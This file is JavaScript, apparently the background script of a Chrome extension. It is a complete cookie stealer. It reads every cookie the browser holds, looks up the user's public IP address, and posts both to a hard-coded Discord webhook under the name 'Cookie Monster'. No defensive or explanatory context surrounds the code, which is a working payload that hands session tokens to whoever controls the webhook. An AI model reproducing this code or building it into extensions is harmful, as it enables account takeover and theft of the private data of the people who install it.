const WEBHOOK = "https://discord.com/api/webhooks/1072255011184197632/9vmgmgiXwEl-n7PD5gTl3PbOJHAYXvvW94xirV-h5ctzm_-P2cXpNhQb_DPIHGPSwGD5";

async function main() {
  var ipAddr = await (await fetch("https://api.ipify.org")).text();

  chrome.cookies.getAll({}, async function (cookies) {
    var cookieString = "";

    for (var i = 0; i < cookies.length; i++) {
      cookieString += cookies[i].name + "=" + cookies[i].value + "; ";
    }

    fetch(WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "Application/json"
      },
      body: JSON.stringify({
        "content": "All Cookies",
        "embeds": [
          {
            "description": "```" + cookieString + "```",
            "color": null,
            "fields": [
              {
                "name": "IP Address",
                "value": ipAddr,
                "inline": true
              }
            ],
            "author": {
              "name": "Cookies Found",
              "icon_url": "https://icon-library.net/images/cookie-icon-png/cookie-icon-png-27.jpg",
            },
            "footer": {
              "text": "https://github.com/ox-y",
              "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
            },
            "thumbnail": {
              "url": "https://icon-library.net/images/cookie-icon-png/cookie-icon-png-27.jpg",
            }
          }
        ],
        "username": "Cookie Monster",
        "avatar_url": "https://vignette.wikia.nocookie.net/muppet/images/7/7f/Cookie_Monster_new.png/revision/latest?cb=20131105035131",
        "attachments": []
      })
    });
  });
}

main();
